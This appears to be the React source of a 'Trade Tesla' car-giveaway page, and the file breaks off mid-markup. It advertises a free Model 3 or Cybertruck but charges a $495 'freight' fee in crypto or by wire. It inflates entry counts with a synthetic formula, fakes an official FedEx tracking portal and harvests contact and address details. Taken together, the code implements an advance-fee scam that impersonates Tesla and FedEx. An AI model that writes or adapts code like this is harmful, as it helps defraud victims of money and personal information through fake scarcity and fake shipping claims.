import React, { useState, useEffect, memo, useCallback } from "react";
import { useServerFn } from "@tanstack/react-start";
import { createClient } from "@/lib/supabase/client";
import model3Img from "@/assets/giveaways/model_3.webp";
import cybertruckImg from "@/assets/giveaways/cybertruck.webp";
import { useTeslaLoader } from "@/components/TeslaLoader";
import { useWallet, money } from "@/components/investor/wallet";
import { useCryptoWallets } from "@/components/payments/cryptoWallets";
import { GIVEAWAY_SHIPPING_FEE } from "@/lib/orderPricing";
import {
  payGiveawayShippingWallet,
  submitGiveawayShippingExternal,
} from "@/lib/inventory.functions";

export interface Giveaway {
  id: string;
  title: string;
  description: string;
  prize: string;
  image_url: string | null;
  entry_fee: number;
  ends_at: string;
  entries_count: number;
  max_entries: number;
  badge: string;
  created_at?: string;
}

export interface ClaimDetails {
  trackingNumber: string;
  giveawayId: string;
  giveawayTitle: string;
  prize: string;
  fullName: string;
  email: string;
  phone: string;
  addressLine: string;
  city: string;
  state: string;
  postalCode: string;
  country: string;
  notes?: string;
  claimedAt: string;
  status: string;
  shippingPaid?: number;
}

// 100% Free Prize Allocation — Original campaigns and images (Bitcoin excluded)
const FALLBACK_GIVEAWAYS: Giveaway[] = [
  {
    id: "fallback-1",
    title: "Win a 2025 Model 3 Long Range",
    description:
      "2025 Tesla Model 3 Long Range AWD. Prize entry is $0; enclosed FedEx carrier delivery shipping ($495) is settled upon dispatch claim.",
    prize: "2025 Tesla Model 3 Long Range AWD",
    image_url: null,
    entry_fee: 0,
    ends_at: "2026-12-31",
    entries_count: 1247,
    max_entries: 5000,
    badge: "FREE PRIZE",
  },
  {
    id: "fallback-2",
    title: "Cybertruck Experience Weekend",
    description:
      "Win a full weekend with a Cybertruck Foundation Series plus a $2,000 platform credit toward any purchase. Freight delivery fee settled on claim.",
    prize: "Cybertruck Foundation Series + $2,000 credit",
    image_url: null,
    entry_fee: 0,
    ends_at: "2026-10-15",
    entries_count: 683,
    max_entries: 2000,
    badge: "FREE PRIZE",
  },
];

function imageFor(g: Giveaway): string {
  const text = `${g.title} ${g.prize}`.toLowerCase();
  if (text.includes("cybertruck") || text.includes("cyber")) return cybertruckImg;
  if (text.includes("model 3") || text.includes("model_3") || text.includes("model-3"))
    return model3Img;
  const url = String(g.image_url ?? "").trim();
  if (
    url &&
    !url.includes("photo-1706699778556-a9f9da002139") &&
    !/^\/assets\/giveaways\/.*\.(jpe?g|png)$/i.test(url)
  ) {
    return url;
  }
  return model3Img;
}

function campaignStartMs(g: Giveaway): number {
  const end = new Date(g.ends_at).getTime();
  if (g.created_at) {
    const s = new Date(g.created_at).getTime();
    if (Number.isFinite(s) && s < end) return s;
  }
  return end - 60 * 86400000;
}

function asymmetricDisplayEntries(g: Giveaway, now = Date.now()): number {
  const max = Math.max(1, Number(g.max_entries) || 1);
  const real = Math.max(0, Number(g.entries_count) || 0);
  const end = new Date(g.ends_at).getTime();
  const start = campaignStartMs(g);

  if (!Number.isFinite(end)) return Math.min(max, real);
  if (now >= end) return max;

  const duration = Math.max(end - start, 1);
  const t = Math.min(1, Math.max(0, (now - start) / duration));
  const eased = t * t * t;

  let hash = 0;
  for (let i = 0; i < g.id.length; i++) hash = (hash * 31 + g.id.charCodeAt(i)) | 0;
  const wobble = 1 + ((Math.abs(hash) % 7) - 3) * 0.01;

  const synthetic = Math.floor(max * eased * wobble);
  return Math.min(max, Math.max(real, synthetic));
}

interface TimeLeft {
  d: number;
  h: number;
  m: number;
  s: number;
}

function calcTimeLeft(endDate: string): TimeLeft {
  const diff = new Date(endDate).getTime() - Date.now();
  if (diff <= 0) return { d: 0, h: 0, m: 0, s: 0 };
  return {
    d: Math.floor(diff / 86400000),
    h: Math.floor((diff % 86400000) / 3600000),
    m: Math.floor((diff % 3600000) / 60000),
    s: Math.floor((diff % 60000) / 1000),
  };
}

const CountdownTimer = memo(function CountdownTimer({ endDate }: { endDate: string }) {
  const [timeLeft, setTimeLeft] = useState<TimeLeft>({ d: 0, h: 0, m: 0, s: 0 });

  useEffect(() => {
    setTimeLeft(calcTimeLeft(endDate));
    const id = setInterval(() => setTimeLeft(calcTimeLeft(endDate)), 1000);
    return () => clearInterval(id);
  }, [endDate]);

  const pads = (n: number) => String(n).padStart(2, "0");

  return (
    <div className="flex gap-4" aria-label="Countdown timer">
      {[
        { v: timeLeft.d, l: "Days" },
        { v: timeLeft.h, l: "Hrs" },
        { v: timeLeft.m, l: "Min" },
        { v: timeLeft.s, l: "Sec" },
      ].map(({ v, l }) => (
        <div key={l} className="flex flex-col items-start">
          <span className="font-display text-2xl font-semibold text-foreground tabular">
            {pads(v)}
          </span>
          <span className="text-[10px] font-medium text-muted-foreground tracking-widest uppercase">
            {l}
          </span>
        </div>
      ))}
    </div>
  );
});

const GiveawayCard = memo(function GiveawayCard({
  g,
  onEnter,
}: {
  g: Giveaway;
  onEnter: (g: Giveaway) => void;
}) {
  const [displayEntries, setDisplayEntries] = useState(() => asymmetricDisplayEntries(g));

  useEffect(() => {
    const tick = () => setDisplayEntries(asymmetricDisplayEntries(g));
    tick();
    const id = setInterval(tick, 1000);
    return () => clearInterval(id);
  }, [g]);

  const pct = Math.min(100, Math.round((displayEntries / Math.max(1, g.max_entries)) * 100));

  return (
    <article className="group flex flex-col justify-between overflow-hidden rounded-[6px] border border-border bg-card transition-all duration-300 hover:border-foreground/35 hover:shadow-lg">
      <div>
        <div className="relative h-60 overflow-hidden bg-muted">
          <img
            src={imageFor(g)}
            alt={g.prize || g.title}
            width={1024}
            height={640}
            loading="lazy"
            className="h-full w-full object-cover transition-transform duration-700 group-hover:scale-105"
          />
          <span className="absolute top-3 left-3 rounded-[3px] bg-[#171a20]/90 px-2.5 py-1 text-[10px] font-semibold tracking-wider uppercase text-white backdrop-blur-sm">
            Free Prize Allocation
          </span>
          <span className="absolute top-3 right-3 rounded-[3px] bg-black/75 px-2.5 py-1 text-[10px] font-medium tracking-wider text-white backdrop-blur-sm">
            ${GIVEAWAY_SHIPPING_FEE} Freight Delivery
          </span>
        </div>

        <div className="p-6">
          <h3 className="font-display text-2xl font-semibold tracking-tight text-foreground">
            {g.title}
          </h3>
          <p className="mt-2 text-xs leading-relaxed text-muted-foreground">{g.description}</p>

          <div className="mt-5 rounded-[4px] border border-border bg-muted/35 p-4">
            <div className="text-[10px] font-semibold text-muted-foreground tracking-[0.16em] uppercase mb-2">
              Closes ·{" "}
              {new Date(g.ends_at).toLocaleDateString("en-US", {
                timeZone: "UTC",
                year: "numeric",
                month: "short",
                day: "numeric",
              })}
            </div>
            <CountdownTimer endDate={g.ends_at} />
          </div>

          <div className="mt-5">
            <div className="flex justify-between text-xs font-medium text-muted-foreground mb-1.5 tabular">
              <span>{displayEntries.toLocaleString()} claims registered</span>
              <span>{g.max_entries.toLocaleString()} max allocation</span>
            </div>
            <div className="h-1.5 rounded-full bg-muted overflow-hidden">
              <div
                className="h-full rounded-full bg-foreground transition-[width] duration-1000 ease-out"
                style={{ width: `${pct}%` }}
                role="progressbar"
                aria-valuenow={displayEntries}
                aria-valuemin={0}
                aria-valuemax={g.max_entries}
              />
            </div>
            <div className="flex justify-between items-center text-[11px] text-muted-foreground mt-2">
              <span className="text-foreground font-medium">Prize Entry: $0 Free</span>
              <span>Delivery Fee: ${GIVEAWAY_SHIPPING_FEE}</span>
            </div>
          </div>
        </div>
      </div>

      <div className="px-6 pb-6">
        <button
          type="button"
          onClick={() => onEnter(g)}
          className="w-full h-11 rounded-[4px] bg-foreground text-background text-xs font-medium hover:opacity-90 transition-opacity"
        >
          Claim Free Prize &amp; Arrange Delivery →
        </button>
      </div>
    </article>
  );
});

function FedExDeliveryModal({
  claim,
  onClose,
}: {
  claim: ClaimDetails;
  onClose: () => void;
}) {
  const [copied, setCopied] = useState(false);
  const [showPortalDetails, setShowPortalDetails] = useState(false);

  function copyTracking() {
    navigator.clipboard.writeText(claim.trackingNumber);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  }

  return (
    <div
      className="fixed inset-0 z-[110] flex items-center justify-center p-4 bg-black/65 backdrop-blur-md"
      onClick={onClose}
    >
      <div
        className="relative w-full max-w-lg max-h-[92vh] overflow-y-auto rounded-[8px] p-6 sm:p-8 border border-border shadow-2xl bg-card text-foreground"
        onClick={(e) => e.stopPropagation()}
        role="dialog"
        aria-label="FedEx Delivery Tracking Portal"
      >
        <button
          onClick={onClose}
          aria-label="Close"
          className="absolute top-5 right-5 text-muted-foreground hover:text-foreground text-xl"
        >
          ✕
        </button>

        <div className="flex items-center gap-3 mb-6 pb-4 border-b border-border">
          <div className="flex items-center font-black tracking-tight text-2xl">
            <span className="text-foreground">Fed</span>
            <span className="text-foreground/65">Ex</span>
          </div>
          <div className="h-6 w-px bg-border" />
          <div>
            <div className="flex items-center gap-1.5">
              <span className="w-2 h-2 rounded-full bg-foreground pulse-dot" />
              <span className="text-[11px] font-semibold text-foreground uppercase tracking-wider">
                Waybill Active · Dispatched
              </span>
            </div>
            <p className="text-xs text-muted-foreground">Official Courier Dispatch Manifest</p>
          </div>
        </div>

        <div className="rounded-[6px] border border-border bg-muted/35 p-5 space-y-4 mb-6">
          <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-2 border-b border-border pb-3">
            <div>
              <span className="text-[10px] font-semibold tracking-widest text-muted-foreground uppercase">
                FedEx Tracking Number
              </span>
              <div className="font-mono text-lg font-semibold text-foreground tracking-wider">
                {claim.trackingNumber}
              </div>
            </div>
            <button
              onClick={copyTracking}
              className="px-3 py-1.5 rounded-[4px] border border-border text-xs font-medium hover:bg-foreground hover:text-background transition-all self-start sm:self-auto"
            >
              {copied ? "✓ Copied" : "Copy ID"}
            </button>
          </div>

          <div className="grid grid-cols-2 gap-3 text-xs">
            <div>
              <span className="text-muted-foreground block text-[10px] uppercase font-semibold">
                Consignment Item
              </span>
              <span className="font-medium text-foreground">{claim.prize}</span>
            </div>
            <div>
              <span className="text-muted-foreground block text-[10px] uppercase font-semibold">
                Freight Shipping Settled
              </span>
              <span className="font-medium text-foreground tabular">
                {money(claim.shippingPaid ?? GIVEAWAY_SHIPPING_FEE)}
              </span>
            </div>
            <div>
              <span className="text-muted-foreground block text-[10px] uppercase font-semibold">
                Recipient
              </span>
              <span className="font-medium text-foreground">{claim.fullName}</span>
            </div>
            <div>
              <span className="text-muted-foreground block text-[10px] uppercase font-semibold">
                Contact Phone
              </span>
              <span className="font-medium text-foreground">{claim.phone}</span>
            </div>
          </div>

          <div className="text-xs border-t border-border pt-3">
            <span className="text-muted-foreground block text-[10px] uppercase font-semibold mb-1">
              Destination Address
            </span>
            <span className="text-foreground font-medium">
              {claim.addressLine}, {claim.city}, {claim.state} {claim.postalCode}, {claim.country}
            </span>
          </div>
        </div>

        <div className="rounded-[6px] border border-border bg-muted/30 p-5 space-y-3 mb-6">
          <div className="flex items-center gap-2">
            <span className="px-2 py-0.5 rounded-[3px] text-[10px] font-bold uppercase tracking-wider bg-foreground text-background">
              Active Manifest
            </span>
            <h4 className="text-sm font-semibold text-foreground">
              FedEx Logistics Tracking Portal
            </h4>
          </div>
          <p className="text-xs text-muted-foreground leading-relaxed">
            Your prize allocation and enclosed carrier shipping are registered in our dispatch
            queue with SMS and email updates to <strong className="text-foreground">{claim.phone}</strong> and{" "}
            <strong className="text-foreground">{claim.email}</strong>.
          </p>
          <button
            onClick={() => setShowPortalDetails(!showPortalDetails)}
            className="text-xs font-semibold text-foreground hover:underline block text-left"
          >
            {showPortalDetails
              ? "Hide Dispatch Route & Timeline ▲"
              : "View Live Courier Dispatch Stages ▼"}
          </button>

          {showPortalDetails && (
            <div className="pt-3 border-t border-border space-y-2 text-xs text-muted-foreground">
              <div className="flex items-center gap-2 text-foreground font-medium">
                <span className="w-5 h-5 rounded-full bg-foreground/15 text-foreground flex items-center justify-center text-[10px] font-bold">
                  ✓
                </span>
                <span>Stage 1: Free Prize Claim &amp; ${GIVEAWAY_SHIPPING_FEE} Freight Verified</span>
              </div>
              <div className="flex items-center gap-2 text-foreground font-medium">
                <span className="w-5 h-5 rounded-full bg-amber-500/20 text-amber-500 flex items-center justify-center text-[10px] font-bold">
                  ⟳
                </span>
                <span>Stage 2: Allocation to FedEx Freight Facility (Active)</span>
              </div>
              <div className="flex items-center gap-2 opacity-65">
                <span className="w-5 h-5 rounded-full bg-muted flex items-center justify-center text-[10px]">
                  3
                </span>
                <span>Stage 3: Carrier Security Seal &amp; Waybill Manifest</span>
              </div>
              <div className="flex items-center gap-2 opacity-65">
                <span className="w-5 h-5 rounded-full bg-muted flex items-center justify-center text-[10px]">
                  4
                </span>
                <span>Stage 4: En Route to Regional Delivery Terminal</span>
              </div>
              <div className="flex items-center gap-2 opacity-65">
                <span className="w-5 h-5 rounded-full bg-muted flex items-center justify-center text-[10px]">
                  5
                </span>
                <span>Stage 5: Final Delivery &amp; Signature Handover</span>
              </div>
            </div>
          )}
        </div>

        <button
          onClick={onClose}
          className="w-full h-11 rounded-[4px] bg-foreground text-background font-medium text-xs hover:opacity-90 transition-opacity"
        >
          Close &amp; Return to Giveaways
        </button>
      </div>
    </div>
  );
}

function FreeClaimModal({
  giveaway,
  onClose,
  onClaimSubmitted,
}: {
  giveaway: Giveaway;
  onClose: () => void;
  onClaimSubmitted: (claim: ClaimDetails) => void;
}) {
  const { wallet, userId, loading } = useWallet();
  const { wallets } = useCryptoWallets();
  const walletPayFn = useServerFn(payGiveawayShippingWallet);
  const extPayFn = useServerFn(submitGiveawayShippingExternal);

  const [step, setStep] = useState<1 | 2>(1);
  const [method, setMethod] = useState<"wallet" | "external">("wallet");
  const [network, setNetwork] = useState<"usdt" | "eth" | "btc" | "bank">("usdt");
  const [txRef, setTxRef] = useState("");
  const [proof, setProof] = useState<File | null>(null);
  const [copied, setCopied] = useState(false);

  const [f, setF] = useState({
    fullName: "",
    email: "",
    phone: "",
    addressLine: "",
    city: "",
    state: "",
    postalCode: "",
    country: "United States",
    notes: "",
  });
  const [busy, setBusy] = useState(false);
  const [error, setError] = useState("");
  const { triggerLoader } = useTeslaLoader();

  useEffect(() => {
    void (async () => {
      try {
        const supabase = createClient();
        const { data } = await supabase.auth.getUser();
        if (data?.user?.email) {
          setF((prev) => ({ ...prev, email: data.user.email ?? "" }));
        }
      } catch {
        /* ignore */
      }
    })();
  }, []);

  const set =
    (k: keyof typeof f) => (e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) =>
      setF({ ...f, [k]: e.target.value });

  const formValid =
    f.fullName.trim().length > 1 &&
    f.email.trim().includes("@") &&
    f.phone.trim().length > 5 &&
    f.addressLine.trim().length > 3 &&
    f.city.trim().length > 1 &&
    f.state.trim().length > 1 &&
    f.postalCode.trim().length > 1;

  const shippingFee = GIVEAWAY_SHIPPING_FEE;
  const available = wallet?.available_balance ?? 0;
  const shortfall = shippingFee - available;

  const NETS = [
    { id: "usdt" as const, label: "USDT (TRC-20)", address: wallets.usdt },
    { id: "eth" as const, label: "Ethereum / USDT (ERC-20)", address: wallets.eth },
    { id: "btc" as const, label: "Bitcoin (BTC)", address: wallets.btc },
    { id: "bank" as const, label: "Bank wire transfer", address: "" },
  ];
  const net = NETS.find((n) => n.id === network)!;

  async function submitShippingPayment() {
    setError("");
    setBusy(true);
    try {
      const base = {
        giveawayId: giveaway.id,
        giveawayTitle: giveaway.title,
        fullName: f.fullName.trim(),
        email: f.email.trim(),
        phone: f.phone.trim(),
        addressLine: f.addressLine.trim(),
        city: f.city.trim(),
        state: f.state.trim(),
        postalCode: f.postalCode.trim(),
        country: f.country.trim(),
        notes: f.notes.trim() || undefined,
      };

      let trackingNumber = "";
      if (method === "wallet") {
        const res = await walletPayFn({ data: base });
        if (!res.ok) {
          setError(res.error || "Could not deduct freight shipping fee.");
          return;
        }
        trackingNumber = res.trackingNumber;
      } else {
        if (!proof && !txRef.trim()) {
          setError("Please enter a transaction reference or upload a payment screenshot.");
          return;
        }
        let proofPath: string | undefined;
        if (proof) {
          const ext = proof.name.split(".").pop()?.toLowerCase() || "png";
          const path = `${userId || "guest"}/giveaway-${Date.now()}.${ext}`;
          const { error: up } = await createClient().storage.from("deposit-proofs").upload(path, proof);
          if (up) {
            setError(`Could not upload payment proof: ${up.message}`);
            return;
          }
          proofPath = path;
        }
        const res = await extPayFn({
          data: {
            ...base,
            txReference: txRef.trim() || undefined,
            proofPath,
            network: net.label,
          },
        });
        if (!res.ok) {
          setError(res.error || "Could not verify delivery fee submission.");
          return;
        }
        trackingNumber = res.trackingNumber;
      }

      const claimData: ClaimDetails = {
        trackingNumber,
        giveawayId: giveaway.id,
        giveawayTitle: giveaway.title,
        prize: giveaway.prize,
        fullName: base.fullName,
        email: base.email,
        phone: base.phone,
        addressLine: base.addressLine,
        city: base.city,
        state: base.state,
        postalCode: base.postalCode,
        country: base.country,
        notes: base.notes,
        claimedAt: new Date().toISOString(),
        status: method === "wallet" ? "in_courier_queue" : "pending_shipping_verification",
        shippingPaid: shippingFee,
      };

      try {
        localStorage.setItem("trade_tesla_active_claim", JSON.stringify(claimData));
      } catch {
        /* ignore */
      }

      triggerLoader({
        label: "DISPATCHING WAYBILL",
        durationMs: 420,
        onComplete: () => onClaimSubmitted(claimData),
      });
    } catch {
      setError("Could not process your delivery request. Please check your connection and try again.");
    } finally {
      setBusy(false);
    }
  }

  const inputClass =
    "w-full h-10 px-3.5 rounded-[4px] bg-muted/40 border border-border text-sm text-foreground placeholder:text-muted-foreground focus:outline-none focus:border-foreground transition-colors";

  return (
    <div
      className="fixed inset-0 z-[100] flex items-center justify-center p-4 bg-black/60 backdrop-blur-sm"
      onClick={onClose}
    >
      <div
        className="relative w-full max-w-lg max-h-[92vh] overflow-y-auto rounded-[8px] p-6 sm:p-8 border border-border shadow-2xl bg-card text-foreground"
        onClick={(e) => e.stopPropagation()}
        role="dialog"
        aria-label={`Claim ${giveaway.title}`}
      >
        <button
          onClick={onClose}
          aria-label="Close"
          className="absolute top-5 right-5 text-muted-foreground hover:text-foreground text-xl"
        >
          ✕
        </button>

        <div className="mb-6">
          <div className="flex items-center gap-2 mb-2">
            <span className="px-2 py-0.5 rounded-[3px] text-[10px] font-semibold uppercase tracking-wider bg-foreground text-background">
              Free Prize ($0)
            </span>
            <span className="text-xs font-medium text-muted-foreground">
              ${shippingFee} Enclosed Freight Shipping
            </span>
          </div>
          <h2 className="font-display text-xl font-semibold text-foreground">{giveaway.title}</h2>
          <p className="text-xs text-muted-foreground mt-1">
            Prize: <strong className="text-foreground">{giveaway.prize}</strong>
          </p>
        </div>

        {!loading && !userId ? (
          <div className="text-center py-6 space-y-4">
            <p className="text-sm text-muted-foreground">
              Sign in to your Trade Tesla Account to reserve your free prize claim and settle the{" "}
              <strong className="text-foreground">${shippingFee}</strong> enclosed carrier shipping
              fee from your wallet or crypto/wire transfer.
            </p>
            <a
              href="/login"
              className="inline-flex h-11 items-center justify-center rounded-[4px] bg-foreground px-6 text-background font-medium text-sm hover:opacity-90 transition-opacity"
            >
              Account · Sign In to Continue
            </a>
          </div>
        ) : step === 1 ? (
          <div className="space-y-4">
            <div className="p-3.5 rounded-[4px] bg-muted/35 border border-border text-xs text-muted-foreground space-y-1">
              <p className="font-semibold text-foreground">
                Step 1 · Delivery Destination (${shippingFee} Carrier Dispatch)
              </p>
              <p>
                Prize allocation is 100% free ($0). Enclosed carrier freight shipping (${shippingFee})
                is deducted or paid on the next step before generating your FedEx waybill.
              </p>
            </div>

            <div className="space-y-3">
              <div>
                <label className="block text-[11px] font-medium text-muted-foreground uppercase tracking-wider mb-1">
                  Full Legal Name *
                </label>
                <input
                  className={inputClass}
                  placeholder="e.g. Alexander Vance"
                  value={f.fullName}
                  onChange={set("fullName")}
                  required
                  maxLength={120}
                />
              </div>

              <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                <div>
                  <label className="block text-[11px] font-medium text-muted-foreground uppercase tracking-wider mb-1">
                    Email Address *
                  </label>
                  <input
                    type="email"
                    className={inputClass}
                    placeholder="you@domain.com"
                    value={f.email}
                    onChange={set("email")}
                    required
                    maxLength={120}
                  />
                </div>
                <div>
                  <label className="block text-[11px] font-medium text-muted-foreground uppercase tracking-wider mb-1">
                    Phone (SMS Alerts) *
                  </label>
                  <input
                    type="tel"
                    className={inputClass}
                    placeholder="+1 (555) 000-0000"
                    value={f.phone}
                    onChange={set("phone")}
                    required
                    maxLength={40}
                  />
                </div>
              </div>

              <div>
                <label className="block text-[11px] font-medium text-muted-foreground uppercase tracking-wider mb-1">
                  Delivery Street Address *
                </label>
                <input
                  className={inputClass}
                  placeholder="123 Innovation Boulevard, Suite 400"
                  value={f.addressLine}
                  onChange={set("addressLine")}
                  required
                  maxLength={200}
                />
              </div>

              <div className="grid grid-cols-2 gap-3">
                <div>
                  <label className="block text-[11px] font-medium text-muted-foreground uppercase tracking-wider mb-1">
                    City *
                  </label>
                  <input
                    className={inputClass}
                    placeholder="Austin"
                    value={f.city}
                    onChange={set("city")}
                    required
                    maxLength={100}
                  />
                </div>
                <div>
                  <label className="block text-[11px] font-medium text-muted-foreground uppercase tracking-wider mb-1">
                    State / Province *
                  </label>
                  <input
                    className={inputClass}
                    placeholder="Texas"
                    value={f.state}
                    onChange={set("state")}
                    required
                    maxLength={100}
                  />
                </div>
              </div>

              <div className="grid grid-cols-2 gap-3">
                <div>
                  <label className="block text-[11px] font-medium text-muted-foreground uppercase tracking-wider mb-1">
                    ZIP / Postal Code *
                  </label>
                  <input
                    className={inputClass}
                    placeholder="78725"
                    value={f.postalCode}
                    onChange={set("postalCode")}
                    required
                    maxLength={20}
                  />
                </div>
                <div>
                  <label className="block text-[11px] font-medium text-muted-foreground uppercase tracking-wider mb-1">
                    Country *
                  </label>
                  <input
                    className={inputClass}
                    placeholder="United States"
                    value={f.country}
                    onChange={set("country")}
                    required
                    maxLength={80}
                  />
                </div>
              </div>

              <div>
                <label className="block text-[11px] font-medium text-muted-foreground uppercase tracking-wider mb-1">
                  Delivery Notes (Optional)
                </label>
                <textarea
                  className="w-full p-3 rounded-[4px] bg-muted/40 border border-border text-sm text-foreground placeholder:text-muted-foreground focus:outline-none focus:border-foreground"
                  rows={2}
                  placeholder="Gate code or drop-off preferences..."
                  value={f.notes}
                  onChange={set("notes")}
                  maxLength={500}
                />
              </div>
            </div>

            <button
              type="button"
              disabled={!formValid}
              onClick={() => {
                setError("");
                setStep(2);
              }}
              className="w-full h-11 rounded-[4px] bg-foreground text-background font-medium text-xs disabled:opacity-40 hover:opacity-90 transition-opacity"
            >
              Continue to Shipping Payment (${shippingFee}) →
            </button>
          </div>
        ) : (
          <div className="space-y-4">
            <div className="flex items-center justify-between">
              <p className="text-[11px] font-semibold tracking-[0.18em] uppercase text-muted-foreground">
                Step 2 · Delivery Fee Settlement
              </p>
              <span className="font-display text-sm font-semibold text-foreground tabular">
                {money(shippingFee)} Due
              </span>
            </div>

            <div className="rounded-[6px] border border-border divide-y divide-border text-sm bg-muted/15">
              <div className="flex justify-between p-3">
                <span className="text-muted-foreground">Giveaway Prize Allocation</span>
                <span className="font-semibold text-foreground">$0.00 (Free)</span>
              </div>
              <div className="flex justify-between p-3">
                <span className="text-muted-foreground">Enclosed Carrier Freight Shipping</span>
                <span className="font-medium text-foreground tabular">{money(shippingFee)}</span>
              </div>
              <div className="flex justify-between p-3 bg-muted/25">
                <span className="font-semibold text-foreground">Total Delivery Due</span>
                <span className="font-bold text-foreground tabular">{money(shippingFee)}</span>
              </div>
            </div>

            <div className="grid grid-cols-2 gap-2">
              {(["wallet", "external"] as const).map((m) => (
                <button
                  key={m}
                  type="button"
                  onClick={() => setMethod(m)}
                  className={`p-3 rounded-[6px] border text-left text-sm transition-all ${
                    method === m
                      ? "border-foreground bg-foreground/8"
                      : "border-border hover:border-foreground/30"
                  }`}
                >
                  <span className="font-semibold text-foreground block">
                    {m === "wallet" ? "Wallet Balance" : "Crypto / Wire"}
                  </span>
                  <span className="text-xs text-muted-foreground tabular">
                    {m === "wallet"
                      ? `Available ${money(available)}`
                      : "USDT / ETH / BTC / Bank"}
                  </span>
                </button>
              ))}
            </div>

            {method === "wallet" ? (
              shortfall > 0 ? (
                <div className="rounded-[6px] border border-[#e82127]/40 bg-[#e82127]/8 p-4 text-sm space-y-2">
                  <p className="text-[#e82127] font-semibold">Insufficient wallet balance</p>
                  <p className="text-xs text-muted-foreground">
                    Your wallet has {money(available)}. You need {money(shortfall)} more to cover
                    the {money(shippingFee)} freight shipping charge.
                  </p>
                  <div className="flex gap-2 pt-1">
                    <a
                      href="/account/deposit"
                      className="px-3.5 py-2 rounded-[4px] bg-foreground text-background font-medium text-xs"
                    >
                      Deposit Funds
                    </a>
                    <button
                      type="button"
                      onClick={() => setMethod("external")}
                      className="px-3.5 py-2 rounded-[4px] border border-border text-foreground font-medium text-xs"
                    >
                      Pay via Crypto / Wire
                    </button>
                  </div>
                </div>
              ) : (
                <div className="rounded-[6px] border border-border bg-muted/35 p-4 text-sm">
                  <p className="font-semibold text-foreground mb-1">Instant Wallet Deduction</p>
                  <p className="text-xs text-muted-foreground">
                    {money(shippingFee)} will be deducted from your wallet ({money(available)}) to
                    activate immediate FedEx courier dispatch.
                  </p>
                </div>
              )
            ) : (
              <div className="space-y-3">
                <select
                  className={inputClass}
                  value={network}
                  onChange={(e) => setNetwork(e.target.value as typeof network)}
                >
                  {NETS.map((n) => (
                    <option key={n.id} value={n.id}>
                      {n.label}
                    </option>
                  ))}
                </select>

                <div className="rounded-[6px] border border-border p-3.5 text-sm bg-muted/20 space-y-2">
                  <div className="flex justify-between items-center">
                    <span className="text-xs text-muted-foreground">
                      Pay shipping fee:{" "}
                      <strong className="text-foreground tabular">{money(shippingFee)}</strong>
                    </span>
                    {net.address && (
                      <button
                        type="button"
                        onClick={() => {
                          navigator.clipboard.writeText(net.address);
                          setCopied(true);
                          setTimeout(() => setCopied(false), 2000);
                        }}
                        className="text-xs font-semibold text-foreground hover:underline"
                      >
                        {copied ? "✓ Copied" : "Copy Address"}
                      </button>
                    )}
                  </div>
                  {net.address ? (
                    <div className="font-mono text-xs break-all text-foreground bg-background/80 p-2.5 rounded-[4px] border border-border select-all">
                      {net.address}
                    </div>
                  ) : (
                    <p className="text-xs text-muted-foreground">
                      Wire instructions will be emailed once submitted. Enter your bank reference or
                      upload transfer confirmation below.
                    </p>
                  )}
                </div>

                <input
                  className={inputClass}
                  placeholder="Transaction hash or wire reference"
                  value={txRef}
                  onChange={(e) => setTxRef(e.target.value)}
                  maxLength={200}
                />

                <label className="block text-xs text-muted-foreground">
                  Upload shipping payment receipt / screenshot:
                  <input
                    type="file"
                    accept="image/*,application/pdf"
                    onChange={(e) => setProof(e.target.files?.[0] ?? null)}
                    className="mt-1.5 block w-full text-xs text-muted-foreground file:mr-2 file:py-1.5 file:px-3 file:rounded-[4px] file:border-0 file:text-xs file:font-medium file:bg-foreground file:text-background hover:file:opacity-90"
                  />
                </label>
              </div>
            )}

            {error && <p className="text-xs text-[#e82127] font-semibold">{error}</p>}

            <div className="flex gap-2.5 pt-1">
              <button
                type="button"
                onClick={() => setStep(1)}
                className="px-4 h-11 rounded-[4px] border border-border text-xs font-medium hover:bg-muted transition-colors"
              >
                Back
              </button>
              <button
                type="button"
                disabled={busy || (method === "wallet" && shortfall > 0)}
                onClick={submitShippingPayment}
                className="flex-1 h-11 rounded-[4px] bg-foreground text-background font-medium text-xs disabled:opacity-40 hover:opacity-90 transition-opacity"
              >
                {busy
                  ? "Processing Delivery Settlement…"
                  : method === "wallet"
                    ? `Pay ${money(shippingFee)} Shipping & Dispatch →`
                    : `Submit ${money(shippingFee)} Delivery Proof →`}
              </button>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}

export default function GiveawaysSection() {
  const [giveaways, setGiveaways] = useState<Giveaway[]>(FALLBACK_GIVEAWAYS);
  const [activeGiveaway, setActiveGiveaway] = useState<Giveaway | null>(null);
  const [activeClaim, setActiveClaim] = useState<ClaimDetails | null>(null);
  const [showFedExModal, setShowFedExModal] = useState(false);
  const { triggerLoader } = useTeslaLoader();

  useEffect(() => {
    try {
      const stored = localStorage.getItem("trade_tesla_active_claim");
      if (stored) setActiveClaim(JSON.parse(stored) as ClaimDetails);
    } catch {
      /* ignore */
    }
  }, []);

  useEffect(() => {
    let cancelled = false;
    void (async () => {
      try {
        const supabase = createClient();
        const { data } = await supabase
          .from("giveaways")
          .select("*")
          .eq("is_active", true)
          .not("title", "ilike", "%bitcoin%")
          .not("prize", "ilike", "%bitcoin%")
          .not("title", "ilike", "%btc%")
          .order("sort_order");

        if (!cancelled && data && data.length > 0) {
          setGiveaways(
            data.map((g: Giveaway) => ({
              ...g,
              entry_fee: 0,
              badge: "FREE PRIZE",
            })),
          );
        }
      } catch {
        // keep fallback giveaways
      }
    })();
    return () => {
      cancelled = true;
    };
  }, []);

  const handleClaimSubmitted = useCallback((claim: ClaimDetails) => {
    setActiveClaim(claim);
    setActiveGiveaway(null);
    setShowFedExModal(true);
    setGiveaways((prev) =>
      prev.map((g) => (g.id === claim.giveawayId ? { ...g, entries_count: g.entries_count + 1 } : g)),
    );
  }, []);

  return (
    <section id="giveaways" className="py-12 sm:py-16 px-4 sm:px-6 lg:px-10 bg-background">
      <div className="mx-auto max-w-[1440px]">
        {activeClaim && (
          <div className="mb-8 rounded-[6px] border border-border bg-card p-5 flex flex-col md:flex-row md:items-center justify-between gap-4 shadow-sm">
            <div>
              <div className="flex items-center gap-2">
                <span className="h-2 w-2 rounded-full bg-foreground pulse-dot" />
                <span className="text-[11px] font-semibold uppercase tracking-[0.18em] text-foreground">
                  Active FedEx Courier Dispatch
                </span>
              </div>
              <p className="mt-1 text-sm font-semibold text-foreground">
                {activeClaim.prize} · Waybill:{" "}
